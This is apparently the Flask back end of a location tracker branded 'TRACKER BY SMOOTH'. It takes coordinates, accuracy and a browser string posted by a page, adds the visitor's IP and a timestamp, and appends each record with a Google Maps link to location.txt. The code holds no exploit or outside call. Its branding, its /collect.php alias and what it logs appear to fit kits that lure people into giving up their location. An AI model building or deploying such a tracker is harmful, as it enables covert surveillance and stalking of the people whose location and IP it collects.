from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
from pathlib import Path
from urllib.parse import quote
import math

app = Flask(__name__)

DATA_FILE = Path(__file__).parent / "location.txt"


@app.get("/")
def home():
    return send_from_directory(app.root_path, "index.html")


@app.get("/<path:filename>")
def frontend_files(filename):
    if filename in ("style.css", "script.js"):
        return send_from_directory(app.root_path, filename)

    return "Not found", 404


@app.route("/collect.php", methods=["POST"])
@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(silent=True)

    if not isinstance(data, dict):
        return jsonify({
            "success": False,
            "message": "Required location data is missing."
        }), 400

    if not all(key in data for key in (
        "latitude", "longitude", "accuracy"
    )):
        return jsonify({
            "success": False,
            "message": "Required location data is missing."
        }), 400

    try:
        latitude = float(data["latitude"])
        longitude = float(data["longitude"])
        accuracy = float(data["accuracy"])

        if not all(map(math.isfinite, [
            latitude, longitude, accuracy
        ])):
            raise ValueError()

        if not -90 <= latitude <= 90:
            raise ValueError()

        if not -180 <= longitude <= 180:
            raise ValueError()

        if accuracy < 0:
            raise ValueError()

    except (TypeError, ValueError):
        return jsonify({
            "success": False,
            "message": "Invalid coordinate values."
        }), 400

    ip = request.remote_addr or "Unavailable"
    browser = str(data.get("browser", "Unavailable"))[:1000]
    browser = browser.replace("\r", " ").replace("\n", " ")

    timestamp = datetime.now().astimezone().strftime(
        "%Y-%m-%d %H:%M:%S"
    )

    map_link = (
        "https://www.google.com/maps?q="
        + quote(f"{latitude},{longitude}")
    )

    entry = (
        "\n"
        "========================================\n"
        "           TRACKER BY SMOOTH            \n"
        "========================================\n"
        f"Time       : {timestamp}\n"
        f"IP Address : {ip}\n"
        f"Latitude   : {latitude}\n"
        f"Longitude  : {longitude}\n"
        f"Accuracy   : {accuracy} metres\n"
        f"Browser    : {browser}\n"
        f"Google Map : {map_link}\n"
        "========================================\n"
    )

    try:
        with DATA_FILE.open("a", encoding="utf-8") as file:
            file.write(entry)
            print(entry)
    except OSError:
        return jsonify({
            "success": False,
            "message": "Could not save location.txt."
        }), 500

    return jsonify({
        "success": True,
        "map": map_link
    })


@app.errorhandler(405)
def method_not_allowed(error):
    return jsonify({
        "success": False,
        "message": "POST requests only."
    }), 405


if __name__ == "__main__":
    app.run(
        host="127.0.0.1",
        port=8080,
        debug=False
    )
